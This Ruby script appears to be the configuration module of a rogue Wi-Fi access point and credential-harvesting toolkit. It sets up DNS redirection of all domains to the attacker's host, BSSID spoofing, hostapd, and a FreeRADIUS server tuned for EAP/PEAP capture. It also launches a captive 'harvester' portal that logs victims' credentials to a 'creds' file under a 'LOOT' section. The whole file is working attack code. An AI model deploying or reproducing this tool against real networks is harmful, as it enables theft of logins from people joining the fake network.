#!/usr/bin/ruby
##################################################################################################
# Created by: PuNk1nPo0p					     				 #
# Configuration Items 						       				 #
##################################################################################################

#CONFIGURABLE FUCNTIONS---------------------------------------------------------------------------------------#

#DHCP -----------------------------------------------#

def config_dhcp	
	system("echo > /etc/dnsmasq.leases")
	dhcp = File.new("conf/#@dhcpfile","w+")
	dhcp.puts("interface=#@interface")
	dhcp.puts("dhcp-range=192.168.10.5,192.168.10.20\n")
	dhcp.puts("dhcp-leasefile=/etc/dnsmasq.leases\n")
	dhcp.puts("dhcp-authoritative\n")
	dhcp.puts("address=/#/192.168.10.1\n")
	dhcp.close
	system("killall dnsmasq && dnsmasq -C conf/#@dhcpfile")
end	

#HOSTAPD----------------------------------------------#

def config_hostapd
	hostapd = File.new("./conf/#@hostapd","w+")
	hostapd.puts("#@apconfig\n")
	hostapd.close
end	

def start_hostapd
	system("xterm -T 'HOSTAPD DEBUG' -e hostapd -d conf/#@hostapd &")
end

#LOOT-------------------------------------------------#

def tail_creds
	system(" xterm -T 'CREDS' -e tail -f logs/creds.txt &")
end

#WEB-PORTAL-------------------------------------------#

def start_harvester
	creds = File.open("logs/creds.txt","w+")
	creds.close
	system("xterm -T 'WEB SERVER DEBUG' -e modules/web_portal.rb sites logs/creds.txt &")
	system("xterm -T 'CAPTIVE PORTAL CREDS' -e tail -f logs/creds.txt &")

end

def start_radius
	system("xterm -T 'RADIUS DEBUG' -e 'radiusd -X | tee logs/radius.log' &")
end

#RADIUS-----------------------------------------------#
	
def config_radius
	text = File.read("/usr/local/etc/raddb/eap.conf")
	text = text.gsub(/^([\s]*eap \{.*?default_eap_type =) .*?$/m,"\\1 #@eaptype")
	if @peapv != "" and @peapv != 0 then text = text.gsub(/^([\s]*peap \{.*?default_eap_type =) .*?$/m,"\\1 #@peapv")
	end
	File.open("/usr/local/etc/raddb/eap.conf", "w") { |file| file.puts text }
end

#INTERFACE--------------------------------------------#

def config_interface
	system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	if @bssid != "" then system("ifconfig #@interface down")
	system("ifconfig #@interface hw ether #@bssid")	
	end
end

def config_networking
	system("ifconfig eth0 down")
	system("brctl addbr br0")
	system("brctl addif br0 eth0")
	system("ifconfig eth0 0.0.0.0 up")
	system("ifconfig br0 up")
end

#STOP-SERVICES----------------------------------------#

def stop_services
	system("killall dhclient")
	system("killall radiusd")
	system("killall hostapd")
	system("killall tail")
	system("ifconfig eth0 down")
	system("ifconfig #@interface down")
	system("ifconfig br0 down")
	system("brctl delif br0 eth0")
	system("brctl delbr br0")
	system("ifconfig eth0 up")
	system("dhclient eth0")
end

